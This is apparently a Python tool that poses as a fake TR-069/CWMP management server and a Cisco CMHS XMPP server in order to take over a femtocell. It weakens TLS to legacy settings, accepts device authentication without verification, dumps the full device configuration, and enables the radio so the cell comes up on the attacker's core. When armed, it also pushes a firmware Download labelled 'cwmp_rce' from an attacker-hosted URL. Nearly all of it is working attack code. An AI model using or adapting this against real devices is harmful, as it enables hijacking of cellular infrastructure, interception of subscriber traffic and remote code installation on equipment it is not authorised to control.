import ssl, socket, datetime, threading, os, re

LOG="/var/log/acs_tr069.log"
BODIES="/var/log/acs_bodies.log"

def log(m):
    line=f"[{datetime.datetime.now().isoformat()}] {m}"
    try: open(LOG,"a").write(line+"\n")
    except: pass
    print(line, flush=True)

def bodylog(m):
    try: open(BODIES,"ab").write(m if isinstance(m,bytes) else m.encode())
    except: pass

def make_ctx(chain, key):
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    c.load_cert_chain(chain, key)
    c.minimum_version=ssl.TLSVersion.TLSv1
    try: c.set_ciphers("ALL:@SECLEVEL=0")
    except Exception: pass
    c.check_hostname=False
    # MUTUAL TLS: femto expects the ACS to request its client (device) cert; we trust
    # its real PKI root (Cisco Root CA M1) so its device chain verifies and it proceeds.
    try:
        c.load_verify_locations("/opt/fakeacs/cisco_clientca.pem")
    except Exception as e:
        log(f"clientCA load failed: {e}")
    c.verify_mode=ssl.CERT_OPTIONAL
    return c

# Per-destination-IP contexts (femto sends NO SNI): pick the cert by the IP it dialed.
CTX={
 "10.179.1.202": make_ctx("/opt/fakeacs/chain202.pem","/opt/fakeacs/leaf.key"),  # CMHS
 "10.179.1.203": make_ctx("/opt/fakeacs/chain203.pem","/opt/fakeacs/leaf.key"),  # ACS/femtocell
}
DEFAULT=CTX["10.179.1.202"]

SOAP_HDR=('<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
          'xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" '
          'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
          'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
          'xmlns:cwmp="urn:dslforum-org:cwmp-1-0">')

def envelope(msgid, body):
    return (SOAP_HDR+
      f'<soap:Header><cwmp:ID soap:mustUnderstand="1">{msgid}</cwmp:ID></soap:Header>'
      f'<soap:Body>{body}</soap:Body></soap:Envelope>')

INFORM_RESP=envelope("1","<cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse>")

def get_param_names(path="", next_level=False):
    return envelope("acs-gpn",
      "<cwmp:GetParameterNames>"
      f"<ParameterPath>{path}</ParameterPath>"
      f"<NextLevel>{'true' if next_level else 'false'}</NextLevel>"
      "</cwmp:GetParameterNames>")

def get_param_values(names):
    items="".join(f"<string>{n}</string>" for n in names)
    return envelope("acs-gpv",
      "<cwmp:GetParameterValues>"
      f'<ParameterNames soap-enc:arrayType="xsd:string[{len(names)}]">{items}</ParameterNames>'
      "</cwmp:GetParameterValues>")

# The knobs that decide whether the cell comes online on OUR core.
KEY_PARAMS=[
 "Device.Services.FAPService.1.FAPControl.AdminState",
 "Device.Services.FAPService.1.FAPControl.OpState",
 "Device.Services.FAPService.1.FAPControl.RFTxStatus",
 "Device.Services.FAPService.1.FAPControl.UMTS.Gateway.SecGWServer1",
 "Device.Services.X_00000C_FAPService.FGW.Fqdn",
 "Device.Services.X_00000C_FAPService.FGW.Status",
 "Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MCC",
 "Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MNC",
 "Device.Services.FAPService.1.CellConfig.UMTS.CN.LACRAC",
 "Device.Services.FAPService.1.CellConfig.UMTS.CN.SAC",
 "Device.Services.FAPService.1.AccessMgmt.AccessMode",
 "Device.Services.FAPService.1.Transport.Tunnel.IKESA.1.IPAddress",
 "Device.Services.FAPService.1.Transport.Tunnel.IKESA.1.Status",
]

def summarize_values(body):
    b=body.decode('latin1','replace')
    pairs=re.findall(r"<Name>([^<]*)</Name>\s*<Value[^>]*>([^<]*)</Value>", b)
    return " | ".join(f"{n.split('.')[-1]}={v}" for n,v in pairs) or "(no name/value pairs parsed)"

def set_param_values(params, key="omni-prov"):
    # params: list of (name, value, xsd_type)
    structs="".join(
      f"<ParameterValueStruct><Name>{n}</Name>"
      f'<Value xsi:type="xsd:{t}">{v}</Value></ParameterValueStruct>'
      for n,v,t in params)
    return envelope("acs-spv",
      "<cwmp:SetParameterValues>"
      f'<ParameterList soap-enc:arrayType="cwmp:ParameterValueStruct[{len(params)}]">{structs}</ParameterList>'
      f"<ParameterKey>{key}</ParameterKey>"
      "</cwmp:SetParameterValues>")


def download(url, size, key="cwmp_rce", ftype="1 Firmware Upgrade Image"):
    return envelope("acs-dl",
      "<cwmp:Download>"
      f"<CommandKey>{key}</CommandKey>"
      f"<FileType>{ftype}</FileType>"
      f"<URL>{url}</URL>"
      "<Username></Username><Password></Password>"
      f"<FileSize>{size}</FileSize>"
      "<TargetFileName></TargetFileName>"
      "<DelaySeconds>0</DelaySeconds>"
      "<SuccessURL></SuccessURL><FailureURL></FailureURL>"
      "</cwmp:Download>")

def cwmp_method(body):
    # The SOAP Header carries <cwmp:ID>, so search for the method AFTER <...:Body>.
    i=body.lower().find(b":body>")
    seg=body[i+6:] if i>=0 else body
    m=re.search(rb"<cwmp:(\w+)", seg)
    return m.group(1).decode() if m else ""

def http_200(body):
    b=body.encode()
    return (f"HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=utf-8\r\n"
            f"Content-Length: {len(b)}\r\nConnection: keep-alive\r\n\r\n").encode()+b

HTTP_204=(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")

def read_http(sock):
    """Read one full HTTP request (headers + Content-Length body). Returns
    (reqline, headers_dict, body_bytes) or (None,None,None) if the peer closed."""
    buf=b""
    while b"\r\n\r\n" not in buf:
        chunk=sock.recv(4096)
        if not chunk: return (None,None,None)
        buf+=chunk
    head,_,rest=buf.partition(b"\r\n\r\n")
    lines=head.decode('latin1','replace').split("\r\n")
    reqline=lines[0] if lines else ""
    hdrs={}
    for ln in lines[1:]:
        if ":" in ln:
            k,v=ln.split(":",1); hdrs[k.strip().lower()]=v.strip()
    clen=int(hdrs.get("content-length","0") or "0")
    body=rest
    while len(body)<clen:
        chunk=sock.recv(4096)
        if not chunk: break
        body+=chunk
    return (reqline, hdrs, body)

def summarize_inform(body):
    b=body.decode('latin1','replace')
    ev=re.findall(r"<EventCode>([^<]*)</EventCode>", b)
    oui=re.findall(r"<OUI>([^<]*)</OUI>", b)
    pc=re.findall(r"<ProductClass>([^<]*)</ProductClass>", b)
    sn=re.findall(r"<SerialNumber>([^<]*)</SerialNumber>", b)
    roots=sorted(set(re.findall(r"<Name>([A-Za-z_]+)\.", b)))
    return f"EventCodes={ev} OUI={oui} ProductClass={pc} SN={sn} paramRoots={roots}"

def handle_cmhs(s, addr):
    # Minimal CMHS (XMPP + Cisco cmhs-v1_0) server. Drives the femto through
    # stream -> SASL EXTERNAL -> restart -> bind(resource=wan) -> bound, then keeps
    # the session alive (ping/pong) so the femto is "connected to management".
    import re as _re, time as _time
    dom = "cmhs1.mso.com"; jid_local = "device"; state = "init"; idc = [1000]
    def sid():
        idc[0]+=1; return f"sv-{idc[0]}"
    def send(x):
        s.sendall(x.encode() if isinstance(x,str) else x)
    s.settimeout(180)
    buf=b""
    try:
        while True:
            try: data=s.recv(8192)
            except Exception as e:
                log(f"{addr} [CMHS] recv-timeout/err {e} (state={state})"); break
            if not data:
                log(f"{addr} [CMHS] peer closed (state={state})"); break
            buf+=data
            txt=buf.decode('latin1','replace')
            bodylog(f"\n==== {addr} [CMHS] state={state} ====\n".encode()+data+b"\n")

            if "<stream:stream" in txt and state in ("init","reauth"):
                mf=_re.search(r"from='([^']*)'", txt); mt=_re.search(r"to='([^']*)'", txt)
                if mf: jid_local=mf.group(1)
                if mt: dom=mt.group(1)
                prolog=("<?xml version=\"1.0\" encoding=\"UTF-8\"?>" if state=="init" else "")
                hdr=(prolog+"<stream:stream"
                     f" from='{dom}' to='{jid_local}' id='{sid()}'"
                     " version='1.0' xml:lang='en'"
                     " xmlns='jabber:server'"
                     " xmlns:stream='http://etherx.jabber.org/streams'"
                     " xmlns:cmhs='http://www.cisco.com/ca/sse/cmhs-v1_0.xsd'>")
                # init stream -> advertise SASL EXTERNAL; post-auth stream -> advertise bind
                if state=="init":
                    feats=("<stream:features><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>"
                           "<mechanism>EXTERNAL</mechanism></mechanisms></stream:features>")
                else:
                    feats="<stream:features><bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'/></stream:features>"
                send(hdr+feats); buf=b""
                log(f"{addr} [CMHS] <- stream+{'sasl' if state=='init' else 'bind'} (from={jid_local} to={dom})")
                continue
            if "<auth" in txt and state=="init":
                send("<success xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/>"); state="reauth"; buf=b""
                log(f"{addr} [CMHS] SASL EXTERNAL -> <success>"); continue
            if "<bind" in txt and state=="reauth":
                mi=_re.search(r"<iq[^>]*id='([^']*)'", txt); iqid=mi.group(1) if mi else sid()
                jid=f"{jid_local}/wan"
                send(f"<iq id='{iqid}' type='result'><bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'><jid>{jid}</jid></bind></iq>")
                state="bound"; buf=b""
                log(f"{addr} [CMHS] bind -> jid={jid}  *** BOUND ***"); continue
            if state=="bound" and "<ping" in txt:
                mi=_re.search(r"<iq[^>]*id='([^']*)'", txt); mfr=_re.search(r"from='([^']*)'", txt)
                iqid=mi.group(1) if mi else sid(); ifr=mfr.group(1) if mfr else jid_local
                send(f"<iq type='result' from='{dom}' to='{ifr}' id='{iqid}'/>"); buf=b""
                log(f"{addr} [CMHS] ping -> pong"); continue
            if state=="bound" and "<presence" in txt:
                log(f"{addr} [CMHS] presence/CMHSStatus rx"); buf=b""; continue
            if state=="bound" and "<iq" in txt:
                mi=_re.search(r"<iq[^>]*id='([^']*)'", txt); iqid=mi.group(1) if mi else sid()
                send(f"<iq type='result' id='{iqid}'/>"); buf=b""
                log(f"{addr} [CMHS] iq -> result"); continue
            if len(buf)>131072: buf=buf[-8192:]
    finally:
        try: s.close()
        except: pass

def handle(raw, addr):
    try: dst=raw.getsockname()[0]
    except Exception: dst="?"
    chan="ACS/femtocell" if dst=="10.179.1.203" else "CMHS/other"
    ctx=CTX.get(dst, DEFAULT)
    log(f"{addr} -> {dst} [{chan}]")
    try:
        raw.settimeout(40)
        s=ctx.wrap_socket(raw, server_side=True)
    except Exception as e:
        log(f"{addr} TLS-FAIL {e}")
        try: raw.close()
        except: pass
        return
    try:
        der=s.getpeercert(True)
        log(f"{addr} [{chan}] TLS-OK clientcert={'len='+str(len(der)) if der else 'no'}")
    except Exception as e:
        log(f"{addr} [{chan}] TLS-OK clientcert-err {e}")

    if chan.startswith("CMHS"):
        handle_cmhs(s, addr); return

    # ACS-side plan: after the CPE's Inform + InformResponse, when the CPE sends its
    # empty POST we issue read-only discovery RPCs, then end the session with 204.
    # (No writes yet: this version maps the data model so we push correct params next.)
    # PROVISIONING: enable the FAP (PLMN + FGW/HNB-GW are already ours), then re-read
    # to confirm. Idempotent: enforced on every ACS session/boot.
    import os as _os
    _sc=[]
    _selfclean_arm="/opt/fakeacs/.selfclean_arm"; _selfclean_sent="/opt/fakeacs/.selfclean_sent"
    if _os.path.exists(_selfclean_arm) and not _os.path.exists(_selfclean_sent):
        _sc=[download("http://10.179.1.202:8080/rmm-selfclean.sdp", 3710, key="selfclean-v1")]
        open(_selfclean_sent,"w").close()  # send at most once per arming
    rpc_queue=[
      *_sc,
      # FULL DUMP: partial-path GPV returns every param+value under the subtree.
      get_param_values(["Device.Services.FAPService.1."]),
      get_param_values(["Device.Services.X_00000C_FAPService."]),
      get_param_names("Device.Services.FAPService.1.", False),
      get_param_names("Device.Services.X_00000C_FAPService.", False),
      set_param_values([
        ("Device.Services.FAPService.1.FAPControl.AdminState","1","boolean"),
        ("Device.Services.X_00000C_FAPService.Enabled","1","boolean"),
      ]),
      get_param_values([
        "Device.Services.FAPService.1.FAPControl.AdminState",
        "Device.Services.FAPService.1.FAPControl.OpState",
        "Device.Services.FAPService.1.FAPControl.RFTxStatus",
        "Device.Services.X_00000C_FAPService.Enabled",
        "Device.Services.X_00000C_FAPService.FGW.Status",
        "Device.Services.X_00000C_FAPService.Radio.Status",
      ]),
    ]
    reqn=0
    try:
        while True:
            reqline,hdrs,body=read_http(s)
            if reqline is None:
                log(f"{addr} [{chan}] peer closed"); break
            reqn+=1
            bodylog(f"\n==== {addr} [{chan}] req#{reqn}: {reqline} (clen={len(body)}) ====\n".encode()+body+b"\n")
            method=cwmp_method(body)
            if method=="Inform":
                log(f"{addr} [{chan}] CWMP Inform: {summarize_inform(body)}")
                s.sendall(http_200(INFORM_RESP))
            elif len(body.strip())==0:
                # CPE has nothing more -> our turn to send an RPC (or end the session).
                if rpc_queue:
                    rpc=rpc_queue.pop(0)
                    log(f"{addr} [{chan}] >>> ACS sends {cwmp_method(rpc.encode())}")
                    s.sendall(http_200(rpc))
                else:
                    log(f"{addr} [{chan}] session done -> 204")
                    s.sendall(HTTP_204); break
            elif b"Fault" in body:
                d=body.decode('latin1','replace')
                log(f"{addr} [{chan}] <<< FAULT code={re.findall(r'<FaultCode>([^<]*)', d)} "
                    f"str={re.findall(r'<FaultString>([^<]*)', d)}")
                if rpc_queue:
                    s.sendall(http_200(rpc_queue.pop(0)))
                else:
                    s.sendall(HTTP_204); break
            else:
                # A response to one of our RPCs.
                if method=="GetParameterValuesResponse":
                    log(f"{addr} [{chan}] <<< VALUES: {summarize_values(body)}")
                elif method=="SetParameterValuesResponse":
                    st=re.findall(r"<Status>([^<]*)</Status>", body.decode('latin1','replace'))
                    log(f"{addr} [{chan}] <<< SPV OK status={st} (0=applied,1=applied-after-reboot)")
                else:
                    log(f"{addr} [{chan}] <<< {method or 'response'} (clen={len(body)})")
                if rpc_queue:
                    s.sendall(http_200(rpc_queue.pop(0)))
                else:
                    s.sendall(HTTP_204); break
    except Exception as e:
        log(f"{addr} [{chan}] err {e}")
    finally:
        try: s.close()
        except: pass

def main():
    srv=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    srv.bind(("0.0.0.0",443)); srv.listen(20)
    log("CWMP ACS v2 listening :443 (proper HTTP framing + CWMP session; discovery mode)")
    while True:
        c,a=srv.accept()
        threading.Thread(target=handle,args=(c,a),daemon=True).start()

main()
